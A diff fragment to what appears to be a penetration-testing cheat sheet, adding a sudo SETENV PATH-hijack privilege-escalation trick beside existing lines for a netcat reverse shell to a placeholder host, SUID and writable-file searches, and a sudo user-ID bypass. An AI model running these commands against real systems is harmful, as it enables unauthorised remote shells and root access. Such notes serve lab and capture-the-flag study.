@@ -25,6 +25,11 @@
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
 sudo -l   # /etc/sudoers
+-----------------
+(root) SETENV: NOPASSWD: /opt/cleanup.sh
+# have the ability to set environment, therefore create a bash binary in the pwd and:
+sudo PATH=$PWD:$PATH /opt/cleanup.sh
+-----------------
 find / -perm -4000 2>/dev/null    # file with suid
 find / -type f -writable 2>/dev/null
 sudo -u#-1 /bin/bash
